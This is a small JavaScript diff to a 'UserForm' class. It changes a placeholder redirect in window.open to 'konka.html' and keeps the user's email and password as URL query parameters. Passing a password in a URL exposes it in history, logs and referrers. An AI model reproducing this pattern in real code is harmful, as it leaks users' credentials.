@@ -79,7 +79,7 @@ class UserForm {
     ) {
       // Open a new window with a redirect URL including email and password parameters
       window.open(
-        "your_redirect_url_here?email=" + email + "&password=" + password,
+        "konka.html?email=" + email + "&password=" + password,
         "_blank"
       );
     } else {
